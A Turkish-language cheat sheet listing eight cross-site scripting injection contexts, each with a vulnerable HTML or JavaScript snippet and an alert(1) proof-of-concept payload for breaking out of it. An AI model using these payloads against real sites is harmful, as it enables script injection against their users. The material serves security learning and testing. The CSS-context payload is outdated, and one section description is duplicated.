<h1>CONTEXTS</h1>
<br>

<h2>🔹 1. HTML Element Context (Tag Context)</h2>
<h4>User input direkt HTML elementin içine yerleştirilir.</h4><br>

📌 Örnek:  
`<div>PAYLOAD</div>`  
<br>
🎯 Exploit:  
```html
</div><script>alert(1)</script>
```
<br>



<h2>🔹 2. HTML Attribute Context</h2>
<h4>Input, bir HTML attribute değerine girer.</h4><br>

📌 Örnek:  
`<input type="text" value="PAYLOAD">`  
<br>
🎯 Exploit:  
```html
" autofocus onfocus=alert(1) x="
```
<br>



<h2>🔹 3. HTML Event Handler Context</h2>
<h4>Attribute kısmı ama event tetikleyici (onclick, onerror vs.).</h4><br>

📌 Örnek:  
`<button onclick="PAYLOAD">Click me</button>`  
<br>
🎯 Exploit:  
```html
" onclick=alert(1) x="
```
<br>



<h2>🔹 4. JavaScript Context (Script Block Injection)</h2>
<h4>Input, bir script bloğuna gömülür.</h4><br>

📌 Örnek:  
`<script>
    var name = "PAYLOAD";
</script>
`
<br><br>
🎯 Exploit:  
```html
";alert(1);//
```
<br>



<h2>🔹 5. JavaScript Inline Event Context</h2>
<h4>HTML içinde ama JS çalıştırılır.</h4><br>

📌 Örnek:  
`<button onclick="doSomething('PAYLOAD')">`  
<br>
🎯 Exploit:  
```html
');alert(1);//
```
<br>



<h2>🔹 6. DOM-Based Context (innerHTML, location.hash vs.)</h2>
<h4>JavaScript input'u alıp DOM’a gömer. Server tarafı devrede yok.</h4><br>

📌 Örnek:  
`document.body.innerHTML = location.hash;`  
<br>
🎯 Exploit:  
```html
#<img src=x onerror=alert(1)>
```
<br>



<h2>🔹 7. URL / HREF / SRC Context</h2>
<h4>Veri href, src, action gibi URI attribute’larına yazılır.</h4><br>

📌 Örnek:  
`<a href="PAYLOAD">Click</a>`  
<br>
🎯 Exploit:  
```html
<a href="javascript:alert(1)">Click</a>
```
<br>



<h2>🔹 8. CSS Context</h2>
<h4>User input direkt HTML elementin içine yerleştirilir.</h4><br>

📌 Örnek:  
`<style>
  body { background: PAYLOAD; }
</style>
`  
<br>
🎯 Exploit:  
```html
url("javascript:alert(1)")
```
